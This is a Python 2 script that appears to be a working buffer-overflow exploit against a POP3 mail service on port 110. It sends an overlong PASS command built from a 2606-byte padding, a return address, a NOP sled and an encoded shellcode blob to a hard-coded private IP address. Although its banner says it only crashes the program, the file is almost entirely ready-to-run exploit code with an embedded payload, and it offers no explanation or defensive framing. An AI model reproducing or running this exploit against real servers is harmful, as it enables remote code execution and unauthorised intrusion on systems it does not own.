import socket


print "This script will crash the progrm runnin at 110/tcp"
print "Usage: python crash.py"

buf =  ""
buf += "\xba\xb5\xa5\x25\xeb\xdb\xd7\xd9\x74\x24\xf4\x5d\x31"
buf += "\xc9\xb1\x52\x31\x55\x12\x83\xed\xfc\x03\xe0\xab\xc7"
buf += "\x1e\xf6\x5c\x85\xe1\x06\x9d\xea\x68\xe3\xac\x2a\x0e"
buf += "\x60\x9e\x9a\x44\x24\x13\x50\x08\xdc\xa0\x14\x85\xd3"
buf += "\x01\x92\xf3\xda\x92\x8f\xc0\x7d\x11\xd2\x14\x5d\x28"
buf += "\x1d\x69\x9c\x6d\x40\x80\xcc\x26\x0e\x37\xe0\x43\x5a"
buf += "\x84\x8b\x18\x4a\x8c\x68\xe8\x6d\xbd\x3f\x62\x34\x1d"
buf += "\xbe\xa7\x4c\x14\xd8\xa4\x69\xee\x53\x1e\x05\xf1\xb5"
buf += "\x6e\xe6\x5e\xf8\x5e\x15\x9e\x3d\x58\xc6\xd5\x37\x9a"
buf += "\x7b\xee\x8c\xe0\xa7\x7b\x16\x42\x23\xdb\xf2\x72\xe0"
buf += "\xba\x71\x78\x4d\xc8\xdd\x9d\x50\x1d\x56\x99\xd9\xa0"
buf += "\xb8\x2b\x99\x86\x1c\x77\x79\xa6\x05\xdd\x2c\xd7\x55"
buf += "\xbe\x91\x7d\x1e\x53\xc5\x0f\x7d\x3c\x2a\x22\x7d\xbc"
buf += "\x24\x35\x0e\x8e\xeb\xed\x98\xa2\x64\x28\x5f\xc4\x5e"
buf += "\x8c\xcf\x3b\x61\xed\xc6\xff\x35\xbd\x70\x29\x36\x56"
buf += "\x80\xd6\xe3\xf9\xd0\x78\x5c\xba\x80\x38\x0c\x52\xca"
buf += "\xb6\x73\x42\xf5\x1c\x1c\xe9\x0c\xf7\xe3\x46\x17\x10"
buf += "\x8c\x94\x27\x1f\xf7\x10\xc1\x75\x17\x75\x5a\xe2\x8e"
buf += "\xdc\x10\x93\x4f\xcb\x5d\x93\xc4\xf8\xa2\x5a\x2d\x74"
buf += "\xb0\x0b\xdd\xc3\xea\x9a\xe2\xf9\x82\x41\x70\x66\x52"
buf += "\x0f\x69\x31\x05\x58\x5f\x48\xc3\x74\xc6\xe2\xf1\x84"
buf += "\x9e\xcd\xb1\x52\x63\xd3\x38\x16\xdf\xf7\x2a\xee\xe0"
buf += "\xb3\x1e\xbe\xb6\x6d\xc8\x78\x61\xdc\xa2\xd2\xde\xb6"
buf += "\x22\xa2\x2c\x09\x34\xab\x78\xff\xd8\x1a\xd5\x46\xe7"
buf += "\x93\xb1\x4e\x90\xc9\x21\xb0\x4b\x4a\x51\xfb\xd1\xfb"
buf += "\xfa\xa2\x80\xb9\x66\x55\x7f\xfd\x9e\xd6\x75\x7e\x65"
buf += "\xc6\xfc\x7b\x21\x40\xed\xf1\x3a\x25\x11\xa5\x3b\x6c"

buffer="A" * 2606 + "\x8f\x35\x4a\x5f" +"\x90"*(390-351) +buf

try:
	print "Fuzzing.....%s bytes" %len(buffer)
	client=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	client.connect(("192.168.25.70",110))
	resp = client.recv(1024)
	client.send("USER teste\r\n")
	resp = client.recv(1024)
        client.send("pass "+buffer+"\r\n")
        resp = client.recv(1024)
        client.send("quit\r\n")
        resp = client.recv(1024)
except:
	print "Saida Programa"	
